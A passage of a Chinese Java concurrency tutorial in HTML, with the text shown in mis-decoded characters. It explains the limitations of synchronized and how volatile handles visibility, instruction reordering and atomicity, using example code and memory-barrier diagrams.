<span class="hljs-bullet">2.</span> æ£€æŸ¥çº¿ç¨‹çŠ¶æ€ï¼š
   â”œâ”€ è¿˜åœ¨æ‰§è¡ŒåŒæ­¥ä»£ç å— â†’ å‡çº§ä¸ºè½»é‡çº§é”
   â””â”€ å·²ç»ç¦»å¼€åŒæ­¥ä»£ç å— â†’ æ¢å¤åˆ°æ— é”çŠ¶æ€
<span class="hljs-bullet">3.</span> å”¤é†’æš‚åœçš„çº¿ç¨‹
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®‰å…¨ç‚¹ï¼Ÿ</strong></p>
<ul>
<li>æ’¤é”€æ—¶éœ€è¦ä¿®æ”¹Mark Word</li>
<li>å¿…é¡»åœ¨çº¿ç¨‹å®‰å…¨ç‚¹è¿›è¡Œï¼ˆçº¿ç¨‹æš‚åœçŠ¶æ€ï¼‰</li>
<li>ç¡®ä¿æ“ä½œçš„åŸå­æ€§</li>
</ul>
<h3 data-id="heading-77">3.4 synchronizedçš„å±€é™æ€§</h3>
<p><strong>è™½ç„¶synchronizedå¾ˆå¼ºå¤§ï¼Œä½†ä¹Ÿæœ‰ä¸€äº›é™åˆ¶ã€‚</strong></p>
<h4 data-id="heading-78">ä¸å¯ä¸­æ–­</h4>
<p><strong>é—®é¢˜ï¼š</strong> çº¿ç¨‹åœ¨ç­‰å¾…synchronizedé”æ—¶ï¼Œæ— æ³•å“åº”ä¸­æ–­</p>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();

<span class="hljs-comment">// çº¿ç¨‹1ï¼šæŒæœ‰é”ï¼Œæ‰§è¡Œå¾ˆé•¿æ—¶é—´</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method1</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(lock) {
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">10000</span>);  <span class="hljs-comment">// æŒæœ‰é”10ç§’</span>
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            <span class="hljs-comment">// å³ä½¿è¢«ä¸­æ–­ï¼Œä¹Ÿä¼šç»§ç»­æŒæœ‰é”</span>
        }
    }
}

<span class="hljs-comment">// çº¿ç¨‹2ï¼šç­‰å¾…è·å–é”</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method2</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// âš ï¸ é—®é¢˜ï¼šæ— æ³•ä¸­æ–­è¿™ä¸ªç­‰å¾…</span>
    <span class="hljs-comment">// å³ä½¿è°ƒç”¨thread.interrupt()ï¼Œçº¿ç¨‹2ä¹Ÿä¸ä¼šå“åº”</span>
    <span class="hljs-keyword">synchronized</span>(lock) {
        <span class="hljs-comment">// å¿…é¡»ç­‰å¾…method1é‡Šæ”¾é”</span>
    }
}
</code></pre>
<p><strong>é—®é¢˜åˆ†æï¼š</strong></p>
<ul>
<li>çº¿ç¨‹2åœ¨ç­‰å¾…é”æ—¶ï¼Œå¦‚æœè°ƒç”¨<code>thread2.interrupt()</code>ï¼Œçº¿ç¨‹2ä¸ä¼šå“åº”</li>
<li>å¿…é¡»ç­‰åˆ°çº¿ç¨‹1é‡Šæ”¾é”ï¼Œçº¿ç¨‹2æ‰èƒ½ç»§ç»­</li>
<li>å¯èƒ½å¯¼è‡´çº¿ç¨‹ä¸€ç›´ç­‰å¾…</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong> ä½¿ç”¨<code>ReentrantLock.lockInterruptibly()</code>ï¼Œå¯ä»¥å“åº”ä¸­æ–­</p>
<h4 data-id="heading-79">éå…¬å¹³é”</h4>
<p><strong>é—®é¢˜ï¼š</strong> synchronizedæ˜¯éå…¬å¹³çš„ï¼Œå¯èƒ½å¯¼è‡´çº¿ç¨‹é¥¥é¥¿</p>
<p><strong>ä»€ä¹ˆæ˜¯éå…¬å¹³ï¼Ÿ</strong></p>
<ul>
<li>æ–°æ¥çš„çº¿ç¨‹å¯èƒ½"æ’é˜Ÿ"</li>
<li>æ¯”ç­‰å¾…é˜Ÿåˆ—ä¸­çš„çº¿ç¨‹å…ˆè·å¾—é”</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();

<span class="hljs-comment">// çº¿ç¨‹Aï¼šç­‰å¾…é”ï¼ˆåœ¨é˜Ÿåˆ—ä¸­ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodA</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(lock) {
        <span class="hljs-comment">// çº¿ç¨‹Aåœ¨é˜Ÿåˆ—ä¸­ç­‰å¾…äº†å¾ˆä¹…</span>
    }
}

<span class="hljs-comment">// çº¿ç¨‹Bï¼šæ–°æ¥çš„çº¿ç¨‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodB</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// âš ï¸ çº¿ç¨‹Bå¯èƒ½æ¯”çº¿ç¨‹Aå…ˆè·å¾—é”ï¼ˆéå…¬å¹³ï¼‰</span>
    <span class="hljs-keyword">synchronized</span>(lock) {
        <span class="hljs-comment">// æ–°çº¿ç¨‹å¯èƒ½æ’é˜ŸæˆåŠŸ</span>
    }
}
</code></pre>
<p><strong>é—®é¢˜åˆ†æï¼š</strong></p>
<ul>
<li>ç­‰å¾…æ—¶é—´é•¿çš„çº¿ç¨‹å¯èƒ½ä¸€ç›´è·å–ä¸åˆ°é”</li>
<li>æ–°æ¥çš„çº¿ç¨‹å¯èƒ½ä¸æ–­æ’é˜Ÿ</li>
<li>å¯¼è‡´æŸäº›çº¿ç¨‹"é¥¥é¥¿"ï¼ˆä¸€ç›´ç­‰å¾…ï¼‰</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong> ä½¿ç”¨<code>ReentrantLock(true)</code>åˆ›å»ºå…¬å¹³é”</p>
<h4 data-id="heading-80">æ€§èƒ½é—®é¢˜</h4>
<p><strong>å†å²æ¼”è¿›ï¼š</strong></p>
<p><strong>JDK 1.6ä¹‹å‰ï¼š</strong></p>
<ul>
<li>synchronizedæ˜¯é‡é‡çº§é”</li>
<li>æ¯æ¬¡åŠ é”éƒ½éœ€è¦æ“ä½œç³»ç»Ÿå‚ä¸</li>
<li>æ€§èƒ½è¾ƒå·®</li>
</ul>
<p><strong>JDK 1.6ä¹‹åï¼š</strong></p>
<ul>
<li>âœ… å¼•å…¥äº†é”å‡çº§æœºåˆ¶ï¼ˆåå‘é” â†’ è½»é‡çº§é” â†’ é‡é‡çº§é”ï¼‰</li>
<li>âœ… æ€§èƒ½å¤§å¹…æå‡</li>
<li>âœ… åœ¨ä½ç«äº‰æƒ…å†µä¸‹ï¼Œæ€§èƒ½æ¥è¿‘æ— é”</li>
</ul>
<p><strong>æ€§èƒ½å¯¹æ¯”ï¼š</strong></p>






























<table><thead><tr><th>åœºæ™¯</th><th>synchronized</th><th>ReentrantLock</th></tr></thead><tbody><tr><td><strong>ä½ç«äº‰</strong></td><td>âœ… æ€§èƒ½å¾ˆå¥½ï¼ˆé”å‡çº§ä¼˜åŒ–ï¼‰</td><td>âœ… æ€§èƒ½ä¹Ÿå¾ˆå¥½</td></tr><tr><td><strong>é«˜ç«äº‰</strong></td><td>âš ï¸ å¯èƒ½å‡çº§ä¸ºé‡é‡çº§é”</td><td>âœ… æ€§èƒ½å¯èƒ½æ›´å¥½</td></tr><tr><td><strong>å¯ä¸­æ–­</strong></td><td>âŒ ä¸æ”¯æŒ</td><td>âœ… æ”¯æŒ</td></tr><tr><td><strong>å…¬å¹³é”</strong></td><td>âŒ éå…¬å¹³</td><td>âœ… å¯é€‰å…¬å¹³/éå…¬å¹³</td></tr></tbody></table>
<p><strong>å»ºè®®ï¼š</strong></p>
<ul>
<li>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œsynchronizedæ€§èƒ½å·²ç»å¾ˆå¥½</li>
<li>éœ€è¦å¯ä¸­æ–­æˆ–å…¬å¹³é”æ—¶ï¼Œä½¿ç”¨ReentrantLock</li>
<li>ä½ç«äº‰åœºæ™¯ï¼šä¸¤è€…æ€§èƒ½æ¥è¿‘</li>
</ul>
<hr/>
<h2 data-id="heading-81">ç¬¬å››ç«  volatileå…³é”®å­—</h2>
<h3 data-id="heading-82">4.1 volatileçš„ä½œç”¨</h3>
<p><strong>volatileæ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<ul>
<li>volatileæ˜¯ä¸€ä¸ªå…³é”®å­—ï¼Œç”¨äºä¿®é¥°å˜é‡</li>
<li>ä¿è¯å˜é‡çš„å¯è§æ€§å’Œæœ‰åºæ€§</li>
<li>ä½†ä¸ä¿è¯åŸå­æ€§</li>
</ul>
<h4 data-id="heading-83">ä¿è¯å¯è§æ€§</h4>
<p><strong>ä»€ä¹ˆæ˜¯å¯è§æ€§é—®é¢˜ï¼Ÿ</strong></p>
<p>åœ¨å¤šæ ¸CPUç¯å¢ƒä¸‹ï¼Œæ¯ä¸ªCPUéƒ½æœ‰è‡ªå·±çš„ç¼“å­˜ã€‚çº¿ç¨‹å¯èƒ½åœ¨è‡ªå·±çš„CPUç¼“å­˜ä¸­ä¿å­˜å˜é‡çš„å‰¯æœ¬ï¼Œå¯¼è‡´ä¸€ä¸ªçº¿ç¨‹çš„ä¿®æ”¹ï¼Œå…¶ä»–çº¿ç¨‹çœ‹ä¸åˆ°ã€‚</p>
<p><strong>å¯è§æ€§é—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é—®é¢˜ä»£ç ï¼šæ²¡æœ‰volatile</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
        <span class="hljs-keyword">while</span> (!flag) {
            <span class="hljs-comment">// âš ï¸ å¯èƒ½æ°¸è¿œå¾ªç¯</span>
            <span class="hljs-comment">// çº¿ç¨‹åœ¨è‡ªå·±çš„CPUç¼“å­˜ä¸­è¯»å–flag=false</span>
            <span class="hljs-comment">// çœ‹ä¸åˆ°ä¸»çº¿ç¨‹ä¿®æ”¹flag=true</span>
        }
        System.out.println(<span class="hljs-string">"çº¿ç¨‹ç»“æŸ"</span>);
    }).start();
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">()</span> {
    flag = <span class="hljs-literal">true</span>;  
    <span class="hljs-comment">// âš ï¸ ä¿®æ”¹å¯èƒ½åªæ›´æ–°åœ¨CPUç¼“å­˜ä¸­</span>
    <span class="hljs-comment">// æ²¡æœ‰åˆ·æ–°åˆ°ä¸»å†…å­˜ï¼Œå…¶ä»–çº¿ç¨‹çœ‹ä¸åˆ°</span>
}
</code></pre>
<p><strong>é—®é¢˜åŸå› ï¼š</strong></p>
<ul>
<li>CPUç¼“å­˜ï¼šæ¯ä¸ªCPUæœ‰è‡ªå·±çš„ç¼“å­˜ï¼Œå˜é‡å¯èƒ½åªå­˜åœ¨ç¼“å­˜ä¸­</li>
<li>ç¼“å­˜æœªåŒæ­¥ï¼šä¿®æ”¹æ²¡æœ‰åˆ·æ–°åˆ°ä¸»å†…å­˜</li>
<li>å…¶ä»–çº¿ç¨‹çœ‹ä¸åˆ°ï¼šä»è‡ªå·±çš„ç¼“å­˜è¯»å–ï¼Œè¿˜æ˜¯æ—§å€¼</li>
</ul>
<p><strong>ä½¿ç”¨volatileè§£å†³ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âœ… è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨volatile</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
        <span class="hljs-keyword">while</span> (!flag) {
            <span class="hljs-comment">// âœ… èƒ½åŠæ—¶çœ‹åˆ°flagçš„å˜åŒ–</span>
            <span class="hljs-comment">// volatileä¿è¯ä»ä¸»å†…å­˜è¯»å–æœ€æ–°å€¼</span>
        }
        System.out.println(<span class="hljs-string">"çº¿ç¨‹ç»“æŸ"</span>);
    }).start();
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">()</span> {
    flag = <span class="hljs-literal">true</span>;  
    <span class="hljs-comment">// âœ… ä¿®æ”¹ç«‹å³åˆ·æ–°åˆ°ä¸»å†…å­˜</span>
    <span class="hljs-comment">// å…¶ä»–çº¿ç¨‹èƒ½ç«‹å³çœ‹åˆ°</span>
}
</code></pre>
<p><strong>volatileçš„å¯è§æ€§ä¿è¯ï¼ˆç®€å•ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">å†™volatileå˜é‡ï¼š
<span class="hljs-bullet">1.</span> çº¿ç¨‹ä¿®æ”¹volatileå˜é‡
<span class="hljs-bullet">2.</span> ç«‹å³åˆ·æ–°åˆ°ä¸»å†…å­˜ï¼ˆä¸æ˜¯åªå†™ç¼“å­˜ï¼‰
<span class="hljs-bullet">3.</span> ä½¿å…¶ä»–CPUçš„ç¼“å­˜å¤±æ•ˆ

è¯»volatileå˜é‡ï¼š
<span class="hljs-bullet">1.</span> çº¿ç¨‹è¯»å–volatileå˜é‡
<span class="hljs-bullet">2.</span> ä»ä¸»å†…å­˜è¯»å–ï¼ˆä¸ä»ç¼“å­˜è¯»ï¼‰
<span class="hljs-bullet">3.</span> ä¿è¯è¯»åˆ°æœ€æ–°å€¼
</code></pre>
<p><strong>ç”Ÿæ´»åŒ–ç†è§£ï¼š</strong></p>
<ul>
<li>æ²¡æœ‰volatileï¼šå°±åƒæ¯ä¸ªäººæœ‰è‡ªå·±çš„ç¬”è®°æœ¬ï¼Œä¿®æ”¹äº†ä½†åˆ«äººçœ‹ä¸åˆ°</li>
<li>æœ‰volatileï¼šå°±åƒå†™åœ¨å…¬å‘Šæ¿ä¸Šï¼Œæ‰€æœ‰äººéƒ½èƒ½çœ‹åˆ°æœ€æ–°å†…å®¹</li>
</ul>
<h4 data-id="heading-84">ç¦æ­¢æŒ‡ä»¤é‡æ’åº</h4>
<p><strong>ä»€ä¹ˆæ˜¯æŒ‡ä»¤é‡æ’åºï¼Ÿ</strong></p>
<p>ä¸ºäº†ä¼˜åŒ–æ€§èƒ½ï¼Œç¼–è¯‘å™¨å’ŒCPUå¯èƒ½ä¼šé‡æ–°æ’åˆ—æŒ‡ä»¤çš„æ‰§è¡Œé¡ºåºã€‚åœ¨å•çº¿ç¨‹ä¸‹æ²¡é—®é¢˜ï¼Œä½†åœ¨å¤šçº¿ç¨‹ä¸‹å¯èƒ½å¯¼è‡´é—®é¢˜ã€‚</p>
<p><strong>é‡æ’åºé—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é—®é¢˜ä»£ç ï¼šå¯èƒ½é‡æ’åº</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// æ²¡æœ‰volatile</span>

<span class="hljs-comment">// çº¿ç¨‹1</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writer</span><span class="hljs-params">()</span> {
    a = <span class="hljs-number">1</span>;      <span class="hljs-comment">// æŒ‡ä»¤1</span>
    b = <span class="hljs-number">2</span>;      <span class="hljs-comment">// æŒ‡ä»¤2</span>
    flag = <span class="hljs-literal">true</span>; <span class="hljs-comment">// æŒ‡ä»¤3</span>
    <span class="hljs-comment">// âš ï¸ å¯èƒ½è¢«é‡æ’åºä¸ºï¼š3 -&gt; 1 -&gt; 2</span>
    <span class="hljs-comment">// CPUæˆ–ç¼–è¯‘å™¨å¯èƒ½ä¼˜åŒ–æ‰§è¡Œé¡ºåº</span>
}

<span class="hljs-comment">// çº¿ç¨‹2</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reader</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (flag) {
        <span class="hljs-type">int</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> a; <span class="hljs-comment">// âš ï¸ å¯èƒ½çœ‹åˆ°a=0ï¼ˆè¿˜æ²¡æ‰§è¡Œa=1ï¼‰</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">r2</span> <span class="hljs-operator">=</span> b; <span class="hljs-comment">// å¯èƒ½çœ‹åˆ°b=2</span>
        <span class="hljs-comment">// å› ä¸ºæŒ‡ä»¤é‡æ’åºï¼Œçœ‹åˆ°ä¸ä¸€è‡´çš„çŠ¶æ€</span>
    }
}
</code></pre>
<p><strong>é—®é¢˜åˆ†æï¼š</strong></p>
<ul>
<li>æŒ‡ä»¤1å’Œ2å¯èƒ½åœ¨æŒ‡ä»¤3ä¹‹åæ‰§è¡Œï¼ˆé‡æ’åºï¼‰</li>
<li>çº¿ç¨‹2çœ‹åˆ°flag=trueæ—¶ï¼Œaå¯èƒ½è¿˜æ˜¯0</li>
<li>å¯¼è‡´æ•°æ®ä¸ä¸€è‡´</li>
</ul>
<p><strong>ä½¿ç”¨volatileè§£å†³ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âœ… è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨volatileç¦æ­¢é‡æ’åº</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// volatileç¦æ­¢é‡æ’åº</span>

<span class="hljs-comment">// çº¿ç¨‹1</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writer</span><span class="hljs-params">()</span> {
    a = <span class="hljs-number">1</span>;      <span class="hljs-comment">// 1</span>
    b = <span class="hljs-number">2</span>;      <span class="hljs-comment">// 2</span>
    flag = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 3</span>
    <span class="hljs-comment">// âœ… volatileå†™ï¼šå‰é¢çš„æ“ä½œä¸èƒ½é‡æ’åºåˆ°åé¢</span>
    <span class="hljs-comment">// ä¿è¯a=1å’Œb=2åœ¨flag=trueä¹‹å‰å®Œæˆ</span>
}

<span class="hljs-comment">// çº¿ç¨‹2</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reader</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (flag) {  
        <span class="hljs-comment">// âœ… volatileè¯»ï¼šåé¢çš„æ“ä½œä¸èƒ½é‡æ’åºåˆ°å‰é¢</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> a; <span class="hljs-comment">// ä¿è¯çœ‹åˆ°a=1ï¼ˆå› ä¸ºvolatileä¿è¯æœ‰åºæ€§ï¼‰</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">r2</span> <span class="hljs-operator">=</span> b; <span class="hljs-comment">// ä¿è¯çœ‹åˆ°b=2</span>
    }
}
</code></pre>
<p><strong>volatileçš„å†…å­˜å±éšœï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<p>volatileé€šè¿‡æ’å…¥å†…å­˜å±éšœæ¥ç¦æ­¢é‡æ’åºï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">å†™<span class="hljs-keyword">volatile</span>å˜é‡ï¼š
æ™®é€šå†™<span class="hljs-number">1</span>
æ™®é€šå†™<span class="hljs-number">2</span>
â”€â”€â”€â”€â”€â”€â”€ StoreStoreå±éšœ â”€â”€â”€â”€â”€â”€â”€  â† ç¦æ­¢ä¸Šé¢çš„æ™®é€šå†™å’Œ<span class="hljs-keyword">volatile</span>å†™é‡æ’åº
<span class="hljs-keyword">volatile</span>å†™
â”€â”€â”€â”€â”€â”€â”€ StoreLoadå±éšœ â”€â”€â”€â”€â”€â”€â”€  â† ç¦æ­¢<span class="hljs-keyword">volatile</span>å†™å’Œä¸‹é¢çš„æ“ä½œé‡æ’åº

è¯»<span class="hljs-keyword">volatile</span>å˜é‡ï¼š
<span class="hljs-keyword">volatile</span>è¯»
â”€â”€â”€â”€â”€â”€â”€ LoadLoadå±éšœ â”€â”€â”€â”€â”€â”€â”€  â† ç¦æ­¢<span class="hljs-keyword">volatile</span>è¯»å’Œä¸‹é¢çš„è¯»é‡æ’åº
â”€â”€â”€â”€â”€â”€â”€ LoadStoreå±éšœ â”€â”€â”€â”€â”€â”€â”€ â† ç¦æ­¢<span class="hljs-keyword">volatile</span>è¯»å’Œä¸‹é¢çš„å†™é‡æ’åº
æ™®é€šè¯»
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>å†…å­˜å±éšœå°±åƒ"æ æ†"ï¼Œé˜»æ­¢æŒ‡ä»¤è·¨è¶Š</li>
<li>volatileå†™å‰çš„æ“ä½œä¸èƒ½ç§»åˆ°å†™ä¹‹å</li>
<li>volatileè¯»åçš„æ“ä½œä¸èƒ½ç§»åˆ°è¯»ä¹‹å‰</li>
<li>ä¿è¯æœ‰åºæ€§</li>
</ul>
<h4 data-id="heading-85">ä¸ä¿è¯åŸå­æ€§</h4>
<p><strong>ä»€ä¹ˆæ˜¯åŸå­æ€§ï¼Ÿ</strong></p>
<ul>
<li>åŸå­æ€§ï¼šæ“ä½œè¦ä¹ˆå…¨éƒ¨æ‰§è¡Œï¼Œè¦ä¹ˆéƒ½ä¸æ‰§è¡Œï¼Œä¸ä¼šè¢«æ‰“æ–­</li>
<li>volatileåªä¿è¯å¯è§æ€§å’Œæœ‰åºæ€§ï¼Œ<strong>ä¸ä¿è¯åŸå­æ€§</strong></li>
</ul>
<p><strong>åŸå­æ€§é—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼švolatileä¸èƒ½ä¿è¯åŸå­æ€§</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count++;  <span class="hljs-comment">// âš ï¸ ä¸æ˜¯åŸå­æ“ä½œ</span>
}

<span class="hljs-comment">// æµ‹è¯•</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        increment();
    }
});

<span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        increment();
    }
});

t1.start();
t2.start();
<span class="hljs-comment">// ç»“æœï¼šæœŸæœ›20000ï¼Œå®é™…å¯èƒ½å°äº20000 âŒ</span>
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆcount++ä¸æ˜¯åŸå­çš„ï¼Ÿ</strong></p>
<p><code>count++</code>å®é™…ä¸ŠåŒ…å«ä¸‰ä¸ªæ­¥éª¤ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// count++çš„åˆ†è§£æ­¥éª¤</span>
<span class="hljs-number">1.</span> è¯»å–countçš„å€¼     (read)
<span class="hljs-number">2.</span> å°†countåŠ <span class="hljs-number">1</span>        (add)
<span class="hljs-number">3.</span> å°†æ–°å€¼å†™å›count   (write)

<span class="hljs-comment">// é—®é¢˜ï¼šè¿™ä¸‰ä¸ªæ­¥éª¤ä¹‹é—´å¯èƒ½è¢«å…¶ä»–çº¿ç¨‹æ‰“æ–­</span>
çº¿ç¨‹<span class="hljs-number">1</span>ï¼šread(count=<span class="hljs-number">100</span>) â†’ add(<span class="hljs-number">101</span>) â†’ [è¢«çº¿ç¨‹<span class="hljs-number">2</span>æ‰“æ–­]
çº¿ç¨‹<span class="hljs-number">2</span>ï¼šread(count=<span class="hljs-number">100</span>) â†’ add(<span class="hljs-number">101</span>) â†’ write(<span class="hljs-number">101</span>)
çº¿ç¨‹<span class="hljs-number">1</span>ï¼šwrite(<span class="hljs-number">101</span>)  <span class="hljs-comment">// ä¸¤ä¸ªçº¿ç¨‹éƒ½åŠ äº†1ï¼Œä½†ç»“æœåªåŠ äº†1æ¬¡</span>
</code></pre>
<p><strong>volatileä¸ºä»€ä¹ˆä¸èƒ½ä¿è¯åŸå­æ€§ï¼Ÿ</strong></p>
<ul>
<li>volatileåªèƒ½ä¿è¯<strong>å•ä¸ªè¯»å†™æ“ä½œ</strong>çš„å¯è§æ€§</li>
<li>ä½†<code>count++</code>æ˜¯<strong>å¤šä¸ªæ“ä½œ</strong>ï¼ˆè¯»-æ”¹-å†™ï¼‰</li>
<li>volatileæ— æ³•ä¿è¯è¿™ä¸‰ä¸ªæ“ä½œä½œä¸ºä¸€ä¸ªæ•´ä½“æ‰§è¡Œ</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âœ… æ–¹æ¡ˆ1ï¼šä½¿ç”¨synchronized</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count++;  <span class="hljs-comment">// æ•´ä¸ªæ–¹æ³•åŸå­æ‰§è¡Œ</span>
}

<span class="hljs-comment">// âœ… æ–¹æ¡ˆ2ï¼šä½¿ç”¨åŸå­ç±»ï¼ˆæ¨èï¼‰</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count.incrementAndGet();  <span class="hljs-comment">// åŸå­æ“ä½œï¼Œå†…éƒ¨ä½¿ç”¨CAS</span>
}
</code></pre>
<p><strong>æ€»ç»“ï¼š</strong></p>
<ul>
<li>âœ… volatileä¿è¯ï¼šå¯è§æ€§ã€æœ‰åºæ€§</li>
<li>âŒ volatileä¸ä¿è¯ï¼šåŸå­æ€§ï¼ˆéœ€è¦synchronizedæˆ–åŸå­ç±»ï¼‰</li>
</ul>
<h3 data-id="heading-86">4.2 volatileçš„å®ç°åŸç†</h3>
<p><strong>volatileå¦‚ä½•å®ç°å¯è§æ€§å’Œæœ‰åºæ€§ï¼Ÿ</strong></p>
<ul>
<li>é€šè¿‡<strong>å†…å­˜å±éšœ</strong>ï¼ˆMemory Barrierï¼‰å®ç°</li>
<li>é€šè¿‡<strong>Lockå‰ç¼€æŒ‡ä»¤</strong>ï¼ˆCPUçº§åˆ«ï¼‰å®ç°</li>
<li>é€šè¿‡<strong>MESIç¼“å­˜ä¸€è‡´æ€§åè®®</strong>ï¼ˆç¡¬ä»¶çº§åˆ«ï¼‰å®ç°</li>
</ul>
